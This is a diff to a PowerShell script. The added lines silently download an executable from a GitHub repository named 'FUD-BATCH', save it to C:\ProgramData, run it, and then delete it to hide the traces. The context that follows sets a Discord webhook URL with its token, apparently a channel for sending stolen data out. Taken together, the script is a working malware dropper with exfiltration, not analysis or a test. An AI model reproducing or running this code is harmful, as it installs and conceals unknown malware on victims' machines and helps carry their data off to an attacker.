@@ -1,3 +1,32 @@
+# Suppress progress messages
+$ProgressPreference = 'SilentlyContinue'
+
+# URL to download the executable from
+$downloadUrl = "https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/test.exe"
+# Path to save the executable in C:\ProgramData
+$exePath = "C:\ProgramData\test.exe" 
+
+# Download the executable from the specified URL
+Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath
+
+# Check if the download was successful
+if (-Not (Test-Path $exePath)) {
+    Write-Host "Failed to download the executable."
+    exit
+} else {
+    Write-Host "Downloaded executable to $exePath"
+}
+
+# Execute the executable
+Start-Process -FilePath $exePath -NoNewWindow -Wait
+
+# Optional: You can add a wait time to allow the process to run for a few seconds
+Start-Sleep -Seconds 5
+
+# Clean up (delete the executable after execution)
+Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
+Write-Host "Executed the executable and cleaned up."
+
 # Discord webhook URL
 $webhook = "https://discord.com/api/webhooks/1301990032567042159/PP7RFPrRII5BKybbo1-7o-YAxVRcdmZmzPMJEt6pcJaSoyc6aWhG4tEzAOeuJXhQRjnw"
 
